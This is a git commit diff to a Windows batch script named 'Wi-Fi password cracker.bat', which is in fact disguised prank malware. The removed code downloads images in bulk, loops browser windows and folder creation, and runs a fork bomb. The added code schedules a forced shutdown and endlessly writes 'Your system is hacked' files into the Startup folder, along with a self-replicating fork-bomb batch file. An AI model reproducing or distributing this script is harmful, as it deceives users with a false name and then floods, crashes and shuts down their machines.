f19ae4bf9c34700a210a4726c3e19d4100a76eb7
Varun Banka <bankavarun18@gmail.com>
2023-01-04 01:11:42 +0530

    made it more powerful

--- Wi-Fi password cracker.bat
+++ Wi-Fi password cracker.bat
@@ -1,45 +1,42 @@
 @echo off
 start "" /wait cmd /c "echo Before prosiding, we need to get your system ready. We may need to open some apps and run some codes so don't close those apps!&echo(&pause"
-CD %HOMEDRIVE%%HOMEPATH%\Start Menu\Programs\Startup
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off1.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off2.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off3.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off4.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off5.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off6.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off7.jpg"
-:G
-start https://www.google.com/
-goto G
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off8.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off9.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off10.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off11.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off12.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off13.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off14.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off15.jpg"
+
 shutdown -s -t 600
-cd "Desktop"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off16.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off17.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off18.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off19.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off20.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off21.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off22.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off23.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off24.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off25.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off26.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off27.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off28.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off29.jpg"
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off30.jpg"
-:A
-mkdir %random%
-goto A
-:x
-start
-goto x
-%0|%0
+
+CD %HOMEDRIVE%%HOMEPATH%\Start Menu\Programs\Startup
+
+:start
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo %0|%0 > dontDelete%random%.bat
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+
+goto start
